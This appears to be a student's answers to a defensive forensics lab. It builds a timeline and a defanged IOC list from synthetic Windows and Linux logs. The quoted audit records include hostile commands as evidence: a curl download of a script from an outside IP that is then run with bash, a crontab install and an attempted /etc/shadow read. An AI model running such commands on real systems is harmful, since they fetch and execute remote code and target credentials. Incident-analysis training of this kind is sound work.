# My answers, timeline and IOC list (synthetic samples)

All data comes from the **synthetic** files in [`samples/`](samples/). The
commands are the ones in the lab README; the outputs quoted below are what I
got when I ran them (jq 1.7, audit userspace 4.0.2 on Debian 13, `TZ=UTC`).

## Part A — Windows (Sysmon + Security log)

Event count by ID (`jq -r '.EventID' sysmon.synthetic.jsonl | sort | uniq -c`):

```text
      6 1
      2 11
      1 13
      2 22
      5 3
```

Process creations (EventID 1), trimmed:

```text
09:12:03  explorer.exe  -> WINWORD.EXE   /n "C:\Users\c.martin\Downloads\Facture_4471.docm"
09:12:17  WINWORD.EXE   -> powershell.exe -NoP -W Hidden -enc VwByAGkAdABl...
09:12:23  powershell.exe-> C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe --silent
09:14:03  explorer.exe  -> chrome.exe                      (normal user activity)
09:17:03  cmd.exe       -> whoami /all
09:17:05  cmd.exe       -> net group "Domain Admins" /domain
```

Decoded `-enc` payload (base64 → UTF-16LE):

```text
Write-Output 'SYNTHETIC LAB EVENT - harmless'
```

Network connections (EventID 3):

```text
09:12:18  powershell.exe  198.51.100.77  cdn-update.example.net  443
09:13:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:14:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:15:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:16:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
```

Failed logons (4625) by source: `12 203.0.113.45`, `2 10.20.30.57`.

### Answers

1. **Initial document / user:** `Facture_4471.docm` (macro-enabled Word file,
   in the Downloads folder) opened by `CORP\c.martin` on `WS-COMPTA-07` at
   09:12:03 UTC.
2. **Process chain:** `explorer.exe → WINWORD.EXE → powershell.exe (hidden,
   encoded) → synchelper.exe`. Word starting PowerShell is the key anomaly —
   Office has no normal reason to spawn a script interpreter.
3. **Contact / drop:** PowerShell resolved `cdn-update.example.net` →
   `198.51.100.77` (Sysmon 22), connected on 443 (Sysmon 3) and wrote
   `C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe` (Sysmon 11,
   09:12:20), which it started 3 s later.
4. **Persistence:** Sysmon 13 at 09:12:21, value
   `HKU\S-1-5-21-…-1105\Software\Microsoft\Windows\CurrentVersion\Run\SyncHelper`
   = `C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe` — a per-user
   Run key pointing to a user-writable path.
5. **Beacon interval:** 09:13:23, 09:14:23, 09:15:23, 09:16:23 → exactly
   **60 s**, no jitter. Perfect regularity is typical of an automated callback.
6. **Discovery:** `whoami /all` then `net group "Domain Admins" /domain` at
   09:17. The second one lists the most privileged accounts — the usual next
   target. Gap I noticed: there is no Sysmon 1 event for the `cmd.exe` parent,
   so I cannot tell from these samples what launched it (I would check the
   real host for a missing event or a different parent).
7. **4625 SubStatus:** `0xc0000064` = user name does not exist;
   `0xc000006a` = user exists, wrong password. From `203.0.113.45`, 12
   failures in about 2.5 minutes over 6 names (`administrator`, `admin`,
   `c.martin`, `j.dupont`, `scanner`, `backup`), logon type 3 (network), no
   workstation name → automated password guessing from outside, and the mix of
   the two codes tells me which names are real accounts (`administrator`,
   `c.martin`, `j.dupont`). The two failures from `10.20.30.57`
   (`WS-COMPTA-07`, user `c.martin`) look like ordinary typos.

## Part B — Linux (auditd)

`aureport -if auditd.synthetic.log -au` (TZ=UTC):

```text
1. 09/14/26 21:40:00 deploy 203.0.113.45 ssh /usr/sbin/sshd no 2001
2. 09/14/26 21:40:03 deploy 203.0.113.45 ssh /usr/sbin/sshd no 2002
3. 09/14/26 21:40:09 deploy 203.0.113.45 ssh /usr/sbin/sshd yes 2003
```

Session 7 (`ausearch --session 7 -i | grep -E 'proctitle|USER_'`), trimmed:

```text
21:40:10  USER_LOGIN  auid=1002 addr=203.0.113.45 res=success
21:40:30  id
21:40:45  curl -s -o /tmp/.cache-upd.sh http://198.51.100.77/update.sh
21:40:52  chmod +x /tmp/.cache-upd.sh
21:40:55  bash /tmp/.cache-upd.sh
21:40:57  crontab /tmp/.c
21:40:58  cat /etc/shadow   -> openat success=no exit=EACCES key=shadow_read
```

Note: `aureport`/`ausearch` print "Error opening config file (Permission
denied)" when run as a normal user; this is harmless with `-if` (it falls back
to built-in defaults). Without `TZ=UTC` the times are shown in local time —
worth remembering when building a UTC timeline.

### Answers

1. `203.0.113.45`: two failed SSH logins then a success for **`deploy`**
   within 9 seconds.
2. Sequence above: recon (`id`) → download to a hidden file in `/tmp` →
   make executable → run → install a crontab → try to read `/etc/shadow`.
3. `auid` (audit/login UID) is set at login and **survives `sudo`/`su`**, so
   it keeps pointing to the account that logged in (here 1002 = `deploy`)
   even if the process later runs as root. `uid` only shows the current identity.
4. The `/etc/shadow` read failed with `EACCES`. A failed attempt still shows
   intent (credential access) and proves the session is hostile — an
   ordinary `deploy` user has no reason to read it.
5. Next checks on a real host: `crontab -l -u deploy`, hash and content of
   `/tmp/.cache-upd.sh` and `/tmp/.c`, outbound connections (`ss -tnp`) and
   firewall/proxy logs for `198.51.100.77`, other logins from `203.0.113.45`,
   whether the `deploy` password is reused elsewhere, then contain (lock the
   account, block the IP) and escalate.

## Part C — Timeline (UTC, 2026-09-14)

| Time | Host | Source | Event | Significance |
|------|------|--------|-------|--------------|
| 07:55:00–07:57:23 | SRV-FILES-01 | Security 4625 | 12 failed network logons from 203.0.113.45, 6 user names | Password guessing; reveals valid names |
| 07:55:40, 08:01:40 | SRV-FILES-01 | Security 4625 | c.martin from 10.20.30.57 | Probably user typos (benign) |
| 09:12:03 | WS-COMPTA-07 | Sysmon 1 | c.martin opens `Facture_4471.docm` | Initial access (malicious document) |
| 09:12:17 | WS-COMPTA-07 | Sysmon 1 | WINWORD → hidden encoded PowerShell | Execution |
| 09:12:18 | WS-COMPTA-07 | Sysmon 22/3 | DNS + HTTPS to cdn-update.example.net (198.51.100.77) | Download / C2 |
| 09:12:20 | WS-COMPTA-07 | Sysmon 11 | `synchelper.exe` written to AppData\Roaming | Payload dropped |
| 09:12:21 | WS-COMPTA-07 | Sysmon 13 | HKU\…\Run\SyncHelper | Persistence |
| 09:12:23 | WS-COMPTA-07 | Sysmon 1 | synchelper.exe --silent | Payload runs |
| 09:13:23–09:16:23 | WS-COMPTA-07 | Sysmon 3 | Connections every 60 s to 198.51.100.77:443 | Beaconing |
| 09:17:03–05 | WS-COMPTA-07 | Sysmon 1 | `whoami /all`, `net group "Domain Admins" /domain` | Discovery |
| 21:40:00–09 | web01 | auditd USER_AUTH | 2 failed + 1 successful SSH login, `deploy`, from 203.0.113.45 | Valid account after guessing |
| 21:40:45 | web01 | auditd EXECVE | curl to `/tmp/.cache-upd.sh` from 198.51.100.77 | Tool transfer |
| 21:40:55 | web01 | auditd EXECVE | `bash /tmp/.cache-upd.sh` | Execution from /tmp |
| 21:40:57 | web01 | auditd EXECVE | `crontab /tmp/.c` | Persistence |
| 21:40:58 | web01 | auditd SYSCALL | `cat /etc/shadow` denied | Credential access attempt |

Link between the two stories: the same external address 203.0.113.45
guesses Windows passwords in the morning and gets into `web01` in the evening,
and 198.51.100.77 serves both the Windows payload and the Linux script.

## IOC list

Extracted with my own tool
(`cat samples/*.jsonl samples/auditd.synthetic.log | python -m seclab.ioc --defang`),
then sorted by hand into internal / external:

| Type | Value (defanged) | Role |
|------|------------------|------|
| IPv4 | 203[.]0[.]113[.]45 | Password guessing (Windows + SSH) |
| IPv4 | 198[.]51[.]100[.]77 | Payload / C2 server |
| Domain | cdn-update[.]example[.]net | Resolves to 198.51.100.77 |
| URL | hxxp://198[.]51[.]100[.]77/update.sh | Linux script download |
| File | `%APPDATA%\SyncHelper\synchelper.exe` (SHA256 placeholder `…0003`) | Windows payload |
| File | `/tmp/.cache-upd.sh`, `/tmp/.c` | Linux script, crontab file |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SyncHelper` | Persistence |
| File | `Facture_4471.docm` | Initial document |

The tool also returned internal values (`10.20.30.57`, `10.20.30.20`,
`intranet.example.com`, the lab host names) and the placeholder hashes of
legitimate binaries (Word, PowerShell, Chrome, whoami, net). They are context,
not indicators, so I left them out — the extractor finds strings, the analyst
decides what is malicious.
